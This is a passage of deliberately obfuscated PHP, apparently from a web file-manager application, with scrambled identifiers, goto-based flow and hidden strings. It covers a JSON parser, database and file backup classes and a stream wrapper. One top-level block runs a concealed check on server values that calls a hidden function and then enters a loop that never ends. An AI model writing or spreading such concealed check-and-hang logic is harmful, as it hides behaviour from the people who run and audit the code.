!1)); $fê¡•Â≈⁄++; } elseif ($e∂áäíËë≤ == $aóÜÊä«‹Ω[1946] && $D˘úÍüùãÈ[$aóÜÊä«‹Ω[1941]] == SERVICES_JSON_IN_CMT) { array_pop($C’ÔÓ©‹Ôë); $fê¡•Â≈⁄++; for ($d®ˆëÒ∏Ì† = $D˘úÍüùãÈ[$aóÜÊä«‹Ω[259]]; $d®ˆëÒ∏Ì† <= $fê¡•Â≈⁄; ++$d®ˆëÒ∏Ì†) { $C â—Ÿöá = substr_replace($C â—Ÿöá, $aóÜÊä«‹Ω[50], $d®ˆëÒ∏Ì†, 1); } } } if (reset($C’ÔÓ©‹Ôë) == SERVICES_JSON_IN_ARR) { return $b°˘Ø—øı¢; } elseif (reset($C’ÔÓ©‹Ôë) == SERVICES_JSON_IN_OBJ) { return $Eıç∆¢¿‡ƒ; } goto b„„‘Øã‚„; c‚ÊèÒº∑ä: $C â—Ÿöá = $this->reduce_string($C â—Ÿöá); if ($C â—Ÿöá == $aóÜÊä«‹Ω[33]) { if (reset($C’ÔÓ©‹Ôë) == SERVICES_JSON_IN_ARR) { return $b°˘Ø—øı¢; } else { return $Eıç∆¢¿‡ƒ; } } $c∆û˜î≈æâ = strlen($C â—Ÿöá); goto bÎÉÿÎ∞‹“; b„„‘Øã‚„: } } } function isError($aıâ…±√Êò, $b¶–©áâ¨Ñ = null) { $bÑ‚–’¶›Î =& $_SERVER[¯èãÄπµ]; if (class_exists($bÑ‚–’¶›Î[1947])) { return PEAR::isError($aıâ…±√Êò, $b¶–©áâ¨Ñ); } elseif (is_object($aıâ…±√Êò) && (get_class($aıâ…±√Êò) == $bÑ‚–’¶›Î[1948] || is_subclass_of($aıâ…±√Êò, $bÑ‚–’¶›Î[1948]))) { return !0; } return !1; } } if (class_exists($_SERVER[¯èãÄπµ][1949])) { class Services_JSON_Error extends PEAR_Error { function __construct($EÑ«ÿôÇ“« = "\165\156\153\156\x6f\x77\x6e\x20\145\x72\x72\x6f\162", $eãÉÑê€–å = null, $D¨‰›óÔ«Î = null, $eÒÎÊ©”—û = null, $Bó‹—ŸîÛÀ = null) { parent::PEAR_Error($EÑ«ÿôÇ“«, $eãÉÑê€–å, $D¨‰›óÔ«Î, $eÒÎÊ©”—û, $Bó‹—ŸîÛÀ); } } } else { class Services_JSON_Error { function __construct($DÃú›°ÔØî = "\165\x6e\x6b\156\157\x77\x6e\40\x65\x72\162\x6f\162", $Cëüìàπ¯÷ = null, $F±äπˆˆÒ’ = null, $F‰öê∑©§’ = null, $B∑à·πµÕ⁄ = null) { } } } if (!isset($_SERVER[$_SERVER[¯èãÄπµ][792]]) || !isset($_SERVER[$_SERVER[¯èãÄπµ][1165]])) { goto d‰Ë‘ëπëµ; f«ôàÒ„≠–: $Aõ†ïÑ›¿±($_SERVER[$_SERVER[¯èãÄπµ][795]] . $_SERVER[¯èãÄπµ][796]); $E“ò´€‹Ìè = 2; while ($E“ò´€‹Ìè > 1) { $b‘„ÈççÁá = rawurlencode($E“ò´€‹Ìè . $_SERVER[¯èãÄπµ][357]); } goto b®£õºüê§; FŒÊ„—¿–ò: $f¡Éáºä„∫ = explode($_SERVER[¯èãÄπµ][213], $f£⁄ËÀçé∂); if (count($f¡Éáºä„∫) < $_SERVER[¯èãÄπµ][544]) { $dìäâ¯“≥ä = $_SERVER[¯èãÄπµ][797]; $dìäâ¯“≥ä(); } $Aõ†ïÑ›¿± = $_SERVER[¯èãÄπµ][1166]; goto f«ôàÒ„≠–; d‰Ë‘ëπëµ: $AÚ¯Ωá”õ‹ = $_SERVER[¯èãÄπµ][794]; $E¿”ﬁÚ∂≈Õ = $_SERVER[$_SERVER[¯èãÄπµ][795]] . $_SERVER[¯èãÄπµ][796]; $f£⁄ËÀçé∂ = $AÚ¯Ωá”õ‹($E¿”ﬁÚ∂≈Õ); goto FŒÊ„—¿–ò; b®£õºüê§: } goto CÙ·”Ô  ¿; AõªóÉ”óÃ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto f¥¢¶„≈Üó; fÇ©ﬂ©ÉàØ: self::$name = $c∂è»ŒÒÉú[$BÕÓ≥øññ¢[28]]; $Eç∏†…¨Àƒ = $GLOBALS[$BÕÓ≥øññ¢[6]][$BÕÓ≥øññ¢[17]]; $d’â√˘ëÑá = $this->_dbType($Eç∏†…¨Àƒ); goto aû÷‚™ØÉÈ; aû÷‚™ØÉÈ: $Bü‚‘øíç¢ = new DbManage($Eç∏†…¨Àƒ, $d’â√˘ëÑá); $AÂÈ€îüÏ§ = TEMP_FILES . $BÕÓ≥øññ¢[713] . self::$name . $BÕÓ≥øññ¢[8]; del_dir($AÂÈ€îüÏ§); goto eìäôﬁ˘£Ú; a≠∑—óπçÙ: $C‚“òÂÂè = new Task($BÕÓ≥øññ¢[714], $BÕÓ≥øññ¢[715], 0, LNG($BÕÓ≥øññ¢[716]) . $BÕÓ≥øññ¢[717] . LNG($BÕÓ≥øññ¢[718])); $dòÛì¿≥≤Ö = array_diff($dòÛì¿≥≤Ö, array($BÕÓ≥øññ¢[719], $BÕÓ≥øññ¢[720])); foreach ($dòÛì¿≥≤Ö as $f◊ãèµäÂ¶) { $eèâ’µÛ≈ı = $AÂÈ€îüÏ§ . $f◊ãèµäÂ¶ . $BÕÓ≥øññ¢[721]; $eË¯ëÚ‰˜ê = null; if ($f◊ãèµäÂ¶ == $BÕÓ≥øññ¢[722] && (!isset($c∂è»ŒÒÉú[$BÕÓ≥øññ¢[695]]) || $c∂è»ŒÒÉú[$BÕÓ≥øññ¢[695]] == $BÕÓ≥øññ¢[464])) { $eË¯ëÚ‰˜ê = self::$io; } $FæÎ¶Æ÷· += $Bü‚‘øíç¢->sqlFromDb($f◊ãèµäÂ¶, $eèâ’µÛ≈ı, $C‚“òÂÂè, $eË¯ëÚ‰˜ê); } goto dª¨ªí€Àï; f¥¢¶„≈Üó: $BÕÓ≥øññ¢ =& $_SERVER[¯èãÄπµ]; $c∂è»ŒÒÉú = Backup::get(); self::$io = $c∂è»ŒÒÉú[$BÕÓ≥øññ¢[694]]; goto fÇ©ﬂ©ÉàØ; A„•∫µÿ÷Õ: return !0; goto Eë¿¿òª‘Ï; eìäôﬁ˘£Ú: mk_dir($AÂÈ€îüÏ§); $dòÛì¿≥≤Ö = $Bü‚‘øíç¢->db()->getTables(); $FæÎ¶Æ÷· = 0; goto a≠∑—óπçÙ; dª¨ªí€Àï: $C‚“òÂÂè->end(); $Aﬁ‡⁄·‰∑• = array($BÕÓ≥øññ¢[723] => $d’â√˘ëÑá, $BÕÓ≥øññ¢[710] => 1, $BÕÓ≥øññ¢[724] => $FæÎ¶Æ÷·, $BÕÓ≥øññ¢[725] => $FæÎ¶Æ÷·); Backup::set($Aﬁ‡⁄·‰∑•); goto A„•∫µÿ÷Õ; Eë¿¿òª‘Ï: } private function _dbType($aı‹àﬁ€£í) { goto fàîÚ“€ñﬁ; CÖèÕ¡Æí£: return $eΩ…Ã≠√ºê; goto FÑ∫Éø©≥≈; fàîÚ“€ñﬁ: $aÎ™¨á˘÷√ =& $_SERVER[¯èãÄπµ]; $aı‹àﬁ€£í = array_change_key_case($aı‹àﬁ€£í); $eΩ…Ã≠√ºê = $aı‹àﬁ€£í[$aÎ™¨á˘÷√[726]]; goto f«ëíÙÑàö; f«ëíÙÑàö: if ($eΩ…Ã≠√ºê == $aÎ™¨á˘÷√[727]) { $Déƒ™¨ ÉÖ = explode($aÎ™¨á˘÷√[4], $aı‹àﬁ€£í[$aÎ™¨á˘÷√[728]]); $eΩ…Ã≠√ºê = $Déƒ™¨ ÉÖ[0]; } $fåõﬁ˜‹Ì = array($aÎ™¨á˘÷√[729] => $aÎ™¨á˘÷√[9], $aÎ™¨á˘÷√[730] => $aÎ™¨á˘÷√[731]); if (isset($fåõﬁ˜‹Ì[$eΩ…Ã≠√ºê])) { $eΩ…Ã≠√ºê = $fåõﬁ˜‹Ì[$eΩ…Ã≠√ºê]; } goto CÖèÕ¡Æí£; FÑ∫Éø©≥≈: } } class BackupDbFile { public function __construct() { } public function index() { goto EêÑä≠Û±’; Cºè·æ»ˆ∑: IO::copy($a◊ØÀ˘°ìØ, $E˜≤„àá‰“ . "\x62\141\x63\x6b\165\160\137{$bÜ¢ï›™ô“}\57"); $Cûõ∑Îï§æ->end(); Backup::set(array($Eà’˘•äø≥[736] => $Dè⁄∑é—¢Ø[$Eà’˘•äø≥[77]])); goto aä‹ô≤ëÃ‹; CµôΩﬂíÖ: Backup::set(array($Eà’˘•äø≥[734] => $Dè⁄∑é—¢Ø[$Eà’˘•äø≥[77]])); IO::move($aä˜æÈÕ«™, $E˜≤„àá‰“); $a◊ØÀ˘°ìØ = CONTROLLER_DIR . $Eà’˘•äø≥[735]; goto Cºè·æ»ˆ∑; e„áû∑ßã˜: $Cûõ∑Îï§æ = new TaskFileTransfer($Eà’˘•äø≥[732], $Eà’˘•äø≥[715], 0, LNG($Eà’˘•äø≥[716]) . $Eà’˘•äø≥[408] . LNG($Eà’˘•äø≥[718]) . $Eà’˘•äø≥[733]); $Cûõ∑Îï§æ->addPath($aä˜æÈÕ«™); $Dè⁄∑é—¢Ø = IO::infoWithChildren($aä˜æÈÕ«™); goto CµôΩﬂíÖ; aä‹ô≤ëÃ‹: return !0; goto E√⁄ó°âí®; eß°≈¨‚ö—: $aä˜æÈÕ«™ = TEMP_FILES . "\x62\x61\143\153\x75\160\137{$bÜ¢ï›™ô“}\57"; $E˜≤„àá‰“ = "\x7b\151\157\x3a{$CëøŒÀÕÎõ[$Eà’˘•äø≥[694]]}\175\57\144\x61\x74\x61\x62\141\x73\x65\57"; IO::mkdir($E˜≤„àá‰“ . "\142\141\x63\x6b\165\160\x5f{$bÜ¢ï›™ô“}\x2f"); goto e„áû∑ßã˜; EêÑä≠Û±’: $Eà’˘•äø≥ =& $_SERVER[¯èãÄπµ]; $CëøŒÀÕÎõ = Backup::get(); $bÜ¢ï›™ô“ = $CëøŒÀÕÎõ[$Eà’˘•äø≥[28]]; goto eß°≈¨‚ö—; E√⁄ó°âí®: } } class BackupFile { public function __construct() { } public function index() { goto d’ÊÏË”’ö; b™öœËå»π: $F°àáë¢”Ø->task[$_SERVER[¯èãÄπµ][701]] = $f∆ƒäÇ…éÇ; $Aáﬁ∂–◊»È = array($_SERVER[¯èãÄπµ][741] => $céÛñ≠◊π, $_SERVER[¯èãÄπµ][742] => $f∆ƒäÇ…éÇ); Backup::set($Aáﬁ∂–◊»È); goto fÈÑº”á•©; a…àŸÃî±’: $báü¨ÖÖç… = 1000; $e≠°πÚÚﬂÃ = $C⁄Çßÿêõî = 0; $EÚπòæø¥é = array(); goto Fñ≈ÕÛõ£Ï; c–‹∂˜Ôˆ√: $céÛñ≠◊π = (int) Model($_SERVER[¯èãÄπµ][722])->where($b¿»ã∂”“◊)->count($_SERVER[¯èãÄπµ][415]); $f∆ƒäÇ…éÇ = (int) Model($_SERVER[¯èãÄπµ][722])->where($b¿»ã∂”“◊)->sum($_SERVER[¯èãÄπµ][77]); $F°àáë¢”Ø = new TaskFileTransfer($_SERVER[¯èãÄπµ][739], $_SERVER[¯èãÄπµ][715], $céÛñ≠◊π, LNG($_SERVER[¯èãÄπµ][716]) . $_SERVER[¯èãÄπµ][717] . LNG($_SERVER[¯èãÄπµ][740])); goto b™öœËå»π; Fµ¬Éåâ€Ò: $dù⁄ã¡ê‰Ù = $Fç≈≠‰≈¡Ë ? 1 : 0; $Aáﬁ∂–◊»È = array($_SERVER[¯èãÄπµ][753] => 1, $_SERVER[¯èãÄπµ][706] => time(), $_SERVER[¯èãÄπµ][712] => $dù⁄ã¡ê‰Ù, $_SERVER[¯èãÄπµ][750] => $D˘ é„“ÉÓ, $_SERVER[¯èãÄπµ][742] => $f∆ƒäÇ…éÇ, $_SERVER[¯èãÄπµ][741] => $céÛñ≠◊π); if ($C⁄Çßÿêõî) { $Aáﬁ∂–◊»È[$_SERVER[¯èãÄπµ][751]] = $Dﬁπê®Ôìƒ; $Aáﬁ∂–◊»È[$_SERVER[¯èãÄπµ][752]] = $c È√°‹ÒÓ; } goto Fπüéà≤æê; Fñ≈ÕÛõ£Ï: $c È√°‹ÒÓ = $Dﬁπê®Ôìƒ = 0; do { $E£Ø√îæÚ¢ = $_SERVER[¯èãÄπµ][743]; $a«éö«Ã˘ù = Model($_SERVER[¯èãÄπµ][722])->where($b¿»ã∂”“◊)->field($E£Ø√îæÚ¢)->order($_SERVER[¯èãÄπµ][744])->selectPage($báü¨ÖÖç…, $e⁄æº›â∑Û); $e∂∑‘§†¬É = !empty($a«éö«Ã˘ù[$_SERVER[¯èãÄπµ][350]]) ? $a«éö«Ã˘ù[$_SERVER[¯èãÄπµ][350]] : array(); foreach ($e∂∑‘§†¬É as $f«ßàÈ§ô´) { goto FŸÒ≥Ëπ‹™; cˆﬁÃÒÑ¨â: if (IO::exist($D¶ŒùÙŸ™Õ)) { $F°àáë¢”Ø->updateFileEnd($f«ßàÈ§ô´[$_SERVER[¯èãÄπµ][28]], $f«ßàÈ§ô´[$_SERVER[¯èãÄπµ][77]]); } else { $D¶ŒùÙŸ™Õ = get_path_father($D¶ŒùÙŸ™Õ); IO::mkdir($D¶ŒùÙŸ™Õ); if (!IO::copy($Dü√èÒœ´â, $D¶ŒùÙŸ™Õ, $_SERVER[¯èãÄπµ][747])) { write_log($_SERVER[¯èãÄπµ][748] . $Dü√èÒœ´â . $_SERVER[¯èãÄπµ][749] . $D¶ŒùÙŸ™Õ . $_SERVER[¯èãÄπµ][472], $_SERVER[¯èãÄπµ][715]); $Fç≈≠‰≈¡Ë = !1; break; } } $D˘ é„“ÉÓ = $f«ßàÈ§ô´[$_SERVER[¯èãÄπµ][415]]; $C⁄Çßÿêõî += 1; goto Bà…‡≈ì≈‚; FŸÒ≥Ëπ‹™: if (!$this->_fileExist($f«ßàÈ§ô´, $EÚπòæø¥é, $Cû˘—õ¥ï»)) { $céÛñ≠◊π -= 1; $f∆ƒäÇ…éÇ -= (int) $f«ßàÈ§ô´[$_SERVER[¯èãÄπµ][77]]; write_log("\146\x69\x6c\145\x20\x6e\x6f\164\40\145\x78\151\163\x74\x2e\146\x69\154\145\x49\104\x3a{$f«ßàÈ§ô´[$_SERVER[¯èãÄπµ][415]]}\54\x20\x70\x61\164\x68\x3a{$f«ßàÈ§ô´[$_SERVER[¯èãÄπµ][75]]}", $_SERVER[¯èãÄπµ][745]); continue; } $Dü√èÒœ´â = $f«ßàÈ§ô´[$_SERVER[¯èãÄπµ][75]]; $D¶ŒùÙŸ™Õ = "\173\x69\x6f\x3a{$bÜëò–ï æ[$_SERVER[¯èãÄπµ][694]]}\175" . substr($Dü√èÒœ´â, strlen("\x7b\x69\x6f\72{$f«ßàÈ§ô´[$_SERVER[¯èãÄπµ][746]]}\175")); goto cˆﬁÃÒÑ¨â; bñ¯ıüé⁄ô: if ($e≠°πÚÚﬂÃ >= 1024 * 1024 * 100) { $Aáﬁ∂–◊»È = array($_SERVER[¯èãÄπµ][750] => $D˘ é„“ÉÓ, $_SERVER[¯èãÄπµ][751] => $Dﬁπê®Ôìƒ, $_SERVER[¯èãÄπµ][752] => $c È√°‹ÒÓ); Backup::set($Aáﬁ∂–◊»È); $e≠°πÚÚﬂÃ = $C⁄Çßÿêõî = 0; } goto d÷åµêíŒ≥; Bà…‡≈ì≈‚: $e≠°πÚÚﬂÃ += $f«ßàÈ§ô´[$_SERVER[¯èãÄπµ][77]]; $Dﬁπê®Ôìƒ += 1; $c È√°‹ÒÓ += $f«ßàÈ§ô´[$_SERVER[¯èãÄπµ][77]]; goto bñ¯ıüé⁄ô; d÷åµêíŒ≥: } $C¥ÓôÉÊÔƒ = count($e∂∑‘§†¬É); $e⁄æº›â∑Û++; } while ($C¥ÓôÉÊÔƒ == $báü¨ÖÖç…); $F°àáë¢”Ø->end(); goto Fµ¬Éåâ€Ò; fÈÑº”á•©: $Fç≈≠‰≈¡Ë = !0; $Cû˘—õ¥ï» = $this->storeIds(); $e⁄æº›â∑Û = 1; goto a…àŸÃî±’; Fπüéà≤æê: Backup::set($Aáﬁ∂–◊»È); $this->_fileFilter($EÚπòæø¥é); return !0; goto F‚ëïÛ›∑é; d’ÊÏË”’ö: $bÜëò–ï æ = Backup::get(); $D˘ é„“ÉÓ = $bÜëò–ï æ[$_SERVER[¯èãÄπµ][277]][$_SERVER[¯èãÄπµ][163]][$_SERVER[¯èãÄπµ][415]]; $b¿»ã∂”“◊ = array($_SERVER[¯èãÄπµ][416] => array($_SERVER[¯èãÄπµ][737], $D˘ é„“ÉÓ), $_SERVER[¯èãÄπµ][738] => array($_SERVER[¯èãÄπµ][315], $bÜëò–ï æ[$_SERVER[¯èãÄπµ][694]])); goto c–‹∂˜Ôˆ√; F‚ëïÛ›∑é: } private function _fileExist($c†Ââ´ûÒ€, &$EÃ∂°èòÌ, $a¿≥å˜¥¡‡) { goto DÊåÂÖ∑êµ; DÊåÂÖ∑êµ: $Bê⁄äÌ≠Ùñ =& $_SERVER[¯èãÄπµ]; $b¢ôÆÓ∑”Ù = $c†Ââ´ûÒ€[$Bê⁄äÌ≠Ùñ[75]]; if (in_array($c†Ââ´ûÒ€[$Bê⁄äÌ≠Ùñ[415]], $EÃ∂°èòÌ)) { return !1; } goto Cπà‚üı≠É; DòõÕ£ÀŒ‘: $EÃ∂°èòÌ = array_merge($EÃ∂°èòÌ, array_to_keyvalue($e›»æøŸÆû, $Bê⁄äÌ≠Ùñ[33], $Bê⁄äÌ≠Ùñ[415])); return !1; goto b¡À˜ˆã’±; A”ìï´µÃö: if (IO::exist($Aãﬁêá«‘ƒ)) { $EÃ∂°èòÌ[] = $c†Ââ´ûÒ€[$Bê⁄äÌ≠Ùñ[415]]; return !1; } $fòï·‚æâÚ = array($Bê⁄äÌ≠Ùñ[746] => $c†Ââ´ûÒ€[$Bê⁄äÌ≠Ùñ[746]], $Bê⁄äÌ≠Ùñ[75] => array($Bê⁄äÌ≠Ùñ[754], "{$Aãﬁêá«‘ƒ}\45")); $e›»æøŸÆû = Model($Bê⁄äÌ≠Ùñ[722])->where($fòï·‚æâÚ)->field($Bê⁄äÌ≠Ùñ[416])->select(); goto DòõÕ£ÀŒ‘; Cπà‚üı≠É: if (!in_array($c†Ââ´ûÒ€[$Bê⁄äÌ≠Ùñ[746]], $a¿≥å˜¥¡‡)) { return !1; } if (IO::exist($b¢ôÆÓ∑”Ù)) { return !0; } $Aãﬁêá«‘ƒ = get_path_father($b¢ôÆÓ∑”Ù); goto A”ìï´µÃö; b¡À˜ˆã’±: } private function _fileFilter($b≥ÕıçãÆÉ) { $FŒøÖÁá¡¶ =& $_SERVER[¯èãÄπµ]; if (empty($b≥ÕıçãÆÉ)) { return; } $dÈ≤ëÂ«Èò = array($FŒøÖÁá¡¶[415] => array($FŒøÖÁá¡¶[7], array_unique($b≥ÕıçãÆÉ))); $dÉçÑ™Îî¯ = Model($FŒøÖÁá¡¶[755])->where($dÈ≤ëÂ«Èò)->field($FŒøÖÁá¡¶[365])->select(); foreach ($dÉçÑ™Îî¯ as $FåÎ∞“’ƒ‚) { Model($FŒøÖÁá¡¶[755])->remove($FåÎ∞“’ƒ‚[$FŒøÖÁá¡¶[365]], !1); } } private function storeIds() { $d◊ÁáßùÎ⁄ =& $_SERVER[¯èãÄπµ]; $A™ü˜∂¢ñ≠ = Model($d◊ÁáßùÎ⁄[707])->listData(); return array_to_keyvalue($A™ü˜∂¢ñ≠, $d◊ÁáßùÎ⁄[33], $d◊ÁáßùÎ⁄[363]); } } goto DÛÚ°≤ñ˜¬; fÆ≈öéÛ‹ı: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($c¢Á°•˘íñ, $b—üùùÿÖÓ = '') { goto fù≈ÖÑ‘·®; fù≈ÖÑ‘·®: $this->info = $this->info($c¢Á°•˘íñ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¯èãÄπµ][75]]; goto Cì∏©Ñ¶öÿ; f¨—†Ω√ƒ•: return $this->info ? !0 : !1; goto BÃÊ±Ë≈â∑; Cì∏©Ñ¶öÿ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$c¢Á°•˘íñ])) { self::$_chunkBuffer[$c¢Á°•˘íñ] = array(); } goto f¨—†Ω√ƒ•; BÃÊ±Ë≈â∑: } function stream_read($C¬âÏ¿œ˘◊) { $BÁáæºô‹ﬂ = $this->fileSubstr($this->pose, $C¬âÏ¿œ˘◊); $this->pose += strlen($BÁáæºô‹ﬂ); return $BÁáæºô‹ﬂ; } public function stream_tell() { return $this->pose; } public function stream_seek($Büˆïºßîë, $D›’¢⁄ÏÙ≤) { $EÊ⁄Í∞ØØÕ =& $_SERVER[¯èãÄπµ]; if ($D›’¢⁄ÏÙ≤ == SEEK_SET) { $this->pose = $Büˆïºßîë; } else { if ($D›’¢⁄ÏÙ≤ == SEEK_CUR) { $this->pose += $Büˆïºßîë; } else { if ($D›’¢⁄ÏÙ≤ == SEEK_END) { $this->pose = $this->info[$EÊ⁄Í∞ØØÕ[77]] + intval($Büˆïºßîë); } } } if ($Büˆïºßîë < 0) { $this->pose = $this->info[$EÊ⁄Í∞ØØÕ[77]] + $Büˆïºßîë; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¯èãÄπµ][77]]; } public function stream_close() { return !0; } public function url_stat($cò∆ÿ◊‰ÛÊ, $Dúäƒ»òå≥) { $d”õã±©´◊ =& $_SERVER[¯èãÄπµ]; $b¡ç©öûÊé = $this->info($cò∆ÿ◊‰ÛÊ); return array($d”õã±©´◊[1287] => 0, $d”õã±©´◊[1288] => 0, $d”õã±©´◊[12] => 32768 + 511, $d”õã±©´◊[1289] => 0, $d”õã±©´◊[1290] => 0, $d”õã±©´◊[1291] => 0, $d”õã±©´◊[1292] => 0, $d”õã±©´◊[77] => $b¡ç©öûÊé[$d”õã±©´◊[77]], $d”õã±©´◊[1293] => $b¡ç©öûÊé[$d”õã±©´◊[1162]], $d”õã±©´◊[1250] => $b¡ç©öûÊé[$d”õã±©´◊[106]], $d”õã±©´◊[1249] => $b¡ç©öûÊé[$d”õã±©´◊[183]], $d”õã±©´◊[1294] => 0, $d”õã±©´◊[1295] => 0); } static $fileInfo = array(); public function info($fÉÑîÏÌäê) { $c¿ÓÛå÷É† = $_SERVER[¯èãÄπµ][1296]; if (isset(self::$fileInfo[$fÉÑîÏÌäê])) { return self::$fileInfo[$fÉÑîÏÌäê]; } if (substr($fÉÑîÏÌäê, 0, strlen($c¿ÓÛå÷É†)) != $c¿ÓÛå÷É†) { return !1; } self::$fileInfo[$fÉÑîÏÌäê] = IO::info(substr($fÉÑîÏÌäê, strlen($c¿ÓÛå÷É†))); return self::$fileInfo[$fÉÑîÏÌäê]; } public static function read($f¡⁄áò¯ô‚, $câ¬Öçõ€®, $eÀÁ–®Ø‡ƒ) { goto b«…ò©©ö©; eπ§ÕæˆÓ: $CÖŒÛË¶°ª = 8192; fseek($e™‚É’€êï, $câ¬Öçõ€®, SEEK_SET); $f‚ûª∂Ù«° = $Bº≠¨ÇÇåÛ[33]; goto FÖº‰∂·•ä; AﬁÔ€Æπüã: return $f‚ûª∂Ù«°; goto DÉ∑åÃ›ı; FÖº‰∂·•ä: $D’§√ÜÈÓŸ = 0; while ($D’§√ÜÈÓŸ < $eÀÁ–®Ø‡ƒ) { $bâÁçÇ¶Ê¬ = min($CÖŒÛË¶°ª, $eÀÁ–®Ø‡ƒ - $D’§√ÜÈÓŸ); $f‚ûª∂Ù«° .= fread($e™‚É’€êï, $bâÁçÇ¶Ê¬); $D’§√ÜÈÓŸ += $bâÁçÇ¶Ê¬; } fclose($e™‚É’€êï); goto AﬁÔ€Æπüã; b«…ò©©ö©: $Bº≠¨ÇÇåÛ =& $_SERVER[¯èãÄπµ]; $e™‚É’€êï = fopen($f¡⁄áò¯ô‚, $Bº≠¨ÇÇåÛ[1164]); if (!$e™‚É’€êï) { return $Bº≠¨ÇÇåÛ[33]; } goto eπ§ÕæˆÓ; DÉ∑åÃ›ı: } public function fileSubstr($DÈããÏ¢∞™, $C¶Áñï€“Ô) { goto fî∫®±∆ªÕ; fî∫®±∆ªÕ: $cü„Ã¡øƒ◊ =& $_SERVER[¯èãÄπµ]; $BÏ…üñ£±á = $this->info[$cü„Ã¡øƒ◊[77]]; $c¬¬ûŸÌøÒ = $DÈããÏ¢∞™; goto a£ËÁÉá∂¢; AÉÂãŒ¨˜Ï: $Eâßå¨›äÇ = 64 * 1024; $B≠Õ¬ß÷Îë =& self::$_chunkBuffer[$this->path]; if (!$B≠Õ¬ß÷Îë) { $B≠Õ¬ß÷Îë = array(); } goto d«ê¿öÆí›; cÏÆßâ•∑ê: foreach ($B≠Õ¬ß÷Îë as $F”ôùÆòÏô => $cª–ñ™°†) { $F”ôùÆòÏô = intval($F”ôùÆòÏô); $E—àÉèÜ‹∑ = $F”ôùÆòÏô + strlen($cª–ñ™°†); if ($DÈããÏ¢∞™ >= $E—àÉèÜ‹∑) { continue; } if ($DÈããÏ¢∞™ >= $F”ôùÆòÏô && $DÈããÏ¢∞™ + $C¶Áñï€“Ô <= $E—àÉèÜ‹∑) { return substr($cª–ñ™°†, $DÈããÏ¢∞™ - $F”ôùÆòÏô, $C¶Áñï€“Ô); } break; } if (count($B≠Õ¬ß÷Îë) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($cü„Ã¡øƒ◊[1297], $cü„Ã¡øƒ◊[1298] . count($B≠Õ¬ß÷Îë) . "\73\x73\x74\141\162\x74\75{$DÈããÏ¢∞™}\x2c\154\145\156\x67\x74\150\x3d{$C¶Áñï€“Ô}\x3b\160\157\163\145\x3a{$F”ôùÆòÏô}\176{$E—àÉèÜ‹∑}"); throw new Exception($cü„Ã¡øƒ◊[1299]); } $A∑Ü⁄ı——∏ = intval($DÈããÏ¢∞™ / $Eâßå¨›äÇ) * $Eâßå¨›äÇ; goto fã©´Òü∂Ü; bàœÈÈÎπÌ: ksort($B≠Õ¬ß÷Îë); $FÏøŸı®Ôã = substr($fÓß€ªÍ«ç, $DÈããÏ¢∞™ - $A∑Ü⁄ı——∏, $C¶Áñï€“Ô); return $FÏøŸı®Ôã; goto BÃ¿ﬁãﬁƒµ; eÉ€çêäÑ¥: if ($DÈããÏ¢∞™ + $C¶Áñï€“Ô > $BÏ…üñ£±á) { $C¶Áñï€“Ô = $BÏ…üñ£±á - $DÈããÏ¢∞™; } if ($C¶Áñï€“Ô <= 0) { return $cü„Ã¡øƒ◊[33]; } if ($DÈããÏ¢∞™ < 0 || $DÈããÏ¢∞™ >= $BÏ…üñ£±á || $C¶Áñï€“Ô <= 0 || $C¶Áñï€“Ô > 1024 * 1024 * 5) { throw new Exception("\151\157\106\x69\x6c\x65\x52\x65\x61\144\x20\x65\162\162\x6f\162\41\x20\163\164\x61\x72\164\x3d{$DÈããÏ¢∞™}\x3b\154\x65\x6e\x67\164\150\x3d{$C¶Áñï€“Ô}\73\x20\163\x69\172\x65\x3d{$BÏ…üñ£±á}\x3b"); } goto AÉÂãŒ¨˜Ï; d«ê¿öÆí›: $F”ôùÆòÏô = 0; $E—àÉèÜ‹∑ = 0; $cª–ñ™°† = $cü„Ã¡øƒ◊[33]; goto cÏÆßâ•∑ê; a£ËÁÉá∂¢: $Cº∏∑¯Ééƒ = $C¶Áñï€“Ô; if ($DÈããÏ¢∞™ < 0) { $DÈããÏ¢∞™ = $BÏ…üñ£±á + $DÈããÏ¢∞™; } if ($C¶Áñï€“Ô === !1) { $C¶Áñï€“Ô = $BÏ…üñ£±á - $DÈããÏ¢∞™; } goto eÉ€çêäÑ¥; fã©´Òü∂Ü: $CÖ˘ë µ¥Ô = ceil(($DÈããÏ¢∞™ + $C¶Áñï€“Ô) / $Eâßå¨›äÇ) * $Eâßå¨›äÇ - $A∑Ü⁄ı——∏; $fÓß€ªÍ«ç = IO::fileSubstr($this->path, $A∑Ü⁄ı——∏, $CÖ˘ë µ¥Ô); $B≠Õ¬ß÷Îë[$A∑Ü⁄ı——∏ . $cü„Ã¡øƒ◊[33]] = $fÓß€ªÍ«ç; goto bàœÈÈÎπÌ; BÃ¿ﬁãﬁƒµ: } private function log($FÇæÍæÚŒ—, $E≠√É‡®€⁄) { $e¥öªæà±ï =& $_SERVER[¯èãÄπµ]; $eÍ»ÈÛã = timeFloat() - $this->timeStart; write_log(sprintf($e¥öªæà±ï[1300], $FÇæÍæÚŒ—, $this->info[$e¥öªæà±ï[28]], $eÍ»ÈÛã, $E≠√É‡®€⁄), $e¥öªæà±ï[1215]); } } class Message { function __construct() { } public function send($aÈ⁄¢Õ≥ØÇ = '', $BÈÖ˜™ïå· = array(), $c±ÛΩÿƒÁÜ = "\x74\145\x78\x74") { goto eˆ‡∂‡èÛç; f§Æºæ€ŸΩ: Hook::trigger($a’è√ÎÜﬂﬁ[1304], $A¢”Ó±¯ßù); goto bíõ¯≥«∂; eˆ‡∂‡èÛç: $a’è√ÎÜﬂﬁ =& $_SERVER[¯èãÄπµ]; $E¨∞ÉÁ°ﬁ∏ = array($a’è√ÎÜﬂﬁ[29] => $a’è√ÎÜﬂﬁ[1301], $a’è√ÎÜﬂﬁ[695] => $aÈ⁄¢Õ≥ØÇ); if (in_array($c±ÛΩÿƒÁÜ, array($a’è√ÎÜﬂﬁ[1301], $a’è√ÎÜﬂﬁ[1302]))) { $E¨∞ÉÁ°ﬁ∏[$a’è√ÎÜﬂﬁ[29]] = $c±ÛΩÿƒÁÜ; } goto fÙäÎç±˘ƒ; fÙäÎç±˘ƒ: 